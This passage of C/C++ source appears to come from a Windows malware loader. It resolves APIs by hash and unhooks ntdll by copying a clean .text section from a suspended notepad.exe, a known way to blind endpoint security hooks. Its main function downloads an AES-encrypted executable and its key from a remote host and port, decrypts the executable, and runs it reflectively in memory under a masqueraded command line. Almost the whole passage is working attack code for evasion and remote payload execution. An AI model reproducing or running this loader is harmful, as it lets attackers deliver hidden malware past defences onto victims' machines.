    pGetModuleInformation GetModuleInformation_ptr = (pGetModuleInformation)get_api_by_hash(HASH_PSAPI, HASH_GetModuleInformation);
    pGetCurrentProcess GetCurrentProcess_ptr = (pGetCurrentProcess)get_api_by_hash(HASH_KERNEL32, HASH_GetCurrentProcess);
    pHeapAlloc HeapAlloc_ptr = (pHeapAlloc)get_api_by_hash(HASH_KERNEL32, HASH_HeapAlloc);
    pGetProcessHeap GetProcessHeap_ptr = (pGetProcessHeap)get_api_by_hash(HASH_KERNEL32, HASH_GetProcessHeap);
    pGetModuleHandleA GetModuleHandleA_ptr = (pGetModuleHandleA)get_api_by_hash(HASH_KERNEL32, HASH_GetModuleHandleA);
    pGetLastError GetLastError_ptr = (pGetLastError)get_api_by_hash(HASH_KERNEL32, HASH_GetLastError);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA_ptr("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess) {
        printf("[-] Error creating process\r\n");
        return NULL;
    }

    HANDLE process = GetCurrentProcess_ptr();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA_ptr("ntdll.dll");
    GetModuleInformation_ptr(process, ntdllModule, &mi, sizeof(mi));

    pntdll = HeapAlloc_ptr(GetProcessHeap_ptr(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory_ptr(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        printf("Failed in reading ntdll (%u)\n", GetLastError_ptr());
        return NULL;
    }

    TerminateProcess_ptr(pi.hProcess, 0);
    return pntdll;
}

BOOL Unhook(LPVOID cleanNtdll) {
    pGetModuleHandleA GetModuleHandleA_ptr = (pGetModuleHandleA)get_api_by_hash(HASH_KERNEL32, HASH_GetModuleHandleA);
    pVirtualProtect VirtualProtect_ptr = (pVirtualProtect)get_api_by_hash(HASH_KERNEL32, HASH_VirtualProtect);
    pMemcpy memcpy_ptr = (pMemcpy)get_api_by_hash(HASH_KERNEL32, HASH_memcpy);
    pStricmp strcmp_ptr = (pStricmp)get_api_by_hash(HASH_KERNEL32, HASH_stricmp);
    pGetLastError GetLastError_ptr = (pGetLastError)get_api_by_hash(HASH_KERNEL32, HASH_GetLastError);

    HMODULE hNtdll = GetModuleHandleA_ptr("ntdll.dll");
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);

    for (int i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (strcmp_ptr((char*)sectionHdr->Name, ".text") == 0) {
            BOOL ProtectStatus1 = VirtualProtect_ptr((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                printf("Failed to change the protection (%u)\n", GetLastError_ptr());
                return FALSE;
            }

            memcpy_ptr((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize);

            BOOL ProtectStatus2 = VirtualProtect_ptr((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                printf("Failed to change the protection back (%u)\n", GetLastError_ptr());
                return FALSE;
            }
        }
    }

    return TRUE;
}

int main(int argc, char** argv) {
    if (argc != 5) {
        printf("[+] Usage: %s <Host> <Port> <Cipher> <Key>\n", argv[0]);
        return 1;
    }

    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* pe = argv[3];
    char* key = argv[4];

    // Use standard CRT functions for simplicity
    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);

    const size_t cSize2 = strlen(pe) + 1;
    wchar_t* wpe = new wchar_t[cSize2];
    mbstowcs(wpe, pe, cSize2);

    const size_t cSize3 = strlen(key) + 1;
    wchar_t* wkey = new wchar_t[cSize3];
    mbstowcs(wkey, key, cSize3);

    printf("\n\n[+] Get AES Encrypted PE from %s:%d\n", host, port);
    DATA PE = GetData(whost, port, wpe);
    if (!PE.data) {
        printf("[-] Failed in getting AES Encrypted PE\n");
        return -1;
    }

    printf("\n[+] Get AES Key from %s:%d\n", host, port);
    DATA keyData = GetData(whost, port, wkey);
    if (!keyData.data) {
        printf("[-] Failed in getting key\n");
        return -2;
    }

    printf("\n[+] AES PE Address : %p\n", PE.data);
    printf("\n[+] AES Key Address : %p\n", keyData.data);

    printf("\n[+] Decrypt the PE \n");
    DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
    printf("\n[+] PE Decrypted\n");

    sz_masqCmd_Ansi = (char*)"whatEver";

    printf("\n[+] Loading and Running PE\n");
    PELoader((char*)PE.data, PE.len);

    printf("\n[+] Finished\n");

    return 0;
}
